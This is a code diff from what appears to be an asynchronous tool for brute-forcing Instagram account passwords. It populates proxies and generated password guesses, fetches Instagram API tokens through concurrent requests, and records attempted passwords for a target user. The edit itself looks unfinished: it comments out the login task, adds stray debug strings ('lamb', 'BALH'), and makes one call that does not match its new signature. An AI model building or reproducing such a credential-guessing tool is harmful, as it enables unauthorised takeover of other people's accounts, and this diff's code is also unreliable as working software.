@@ -27,7 +27,7 @@ class Engine(object):
         'consume_passwords': 'Login with Proxy',
         'populate_proxies': 'Populating Proxies',
         'populate_passwords': 'Populating Passwords',
-        'get_token': 'Fetching Token',
+        'get_tokens': 'Fetching Token',
         'consume_attempts': 'Storing Attempted Password',
     }
 
@@ -81,15 +81,13 @@ class EngineAsync(Engine):
         Retrieves passwords generated passwords that have not been attempted
         from the User object and populates the password queue.
         """
-        count = 1
         for password in self.user.get_new_attempts():
-            count += 1
             self.passwords.put_nowait(password)
 
         if self.passwords.empty():
             raise exceptions.EngineException("No new passwords to try.")
 
-        log.info(f"Populated {count} Passwords")
+        log.info(f"Populated {self.passwords.qsize()} Passwords")
 
     @auto_logger
     async def populate_proxies(self, loop, log):
@@ -124,7 +122,7 @@ class EngineAsync(Engine):
         log.info(f"Populated {len(self.proxy_list)} Proxies")
 
     @auto_logger(show_running=False)
-    async def get_token(self, loop, log):
+    async def get_tokens(self, loop, log):
         """
         Returns a list of tokens based on 20 concurrent requests to the Instagram
         API.  On average, it returns about 6-7 tokens, which we will use as fallbacks
@@ -208,39 +206,42 @@ class EngineAsync(Engine):
             This might have something to do with return_exceptions **kwarg in the
             asyncio.gather_tasks call.
             """
-            tokens = await asyncio.ensure_future(self.get_token(loop))
+            tokens = await asyncio.ensure_future(self.get_tokens(loop))
 
             attack_tasks = (
+                # loop.create_task(
+                #     self.handle_exception(
+                #         self.consume_passwords(tokens, loop), loop
+                #     )
+                # ),
                 loop.create_task(
                     self.handle_exception(
-                        self.consume_passwords(tokens, loop), loop
-                    )
-                ),
-                loop.create_task(
-                    self.handle_exception(
-                        self.consume_attempts(tokens, loop), loop
+                        self.consume_attempts(loop), loop
                     )
                 )
             )
+            self.attempts.put_nowait("lamb")
             await asyncio.gather(*attack_tasks)
+            self.attempts.put_nowait("BALH")
 
         finally:
             self.log.info('Cleaning up')
             loop.stop()
 
     @auto_logger(show_running=False)
-    async def consume_attempts(self, queue, log):
+    async def consume_attempts(self, tokens, log):
         while not self.stop_event.is_set():
             try:
-                attempt = queue.get_nowait()
+                attempt = self.attempts.get_nowait()
             except asyncio.QueueEmpty:
                 continue
             else:
                 async with self.lock:
+                    log.info(f"Storing User Attempt {attempt}")
                     self.user.add_password_attempt(attempt)
 
     @auto_logger(show_running=False)
-    async def consume_passwords(self, queue, log):
+    async def consume_passwords(self, tokens, log):
 
         def callback(fut):
             exc = fut.exception()
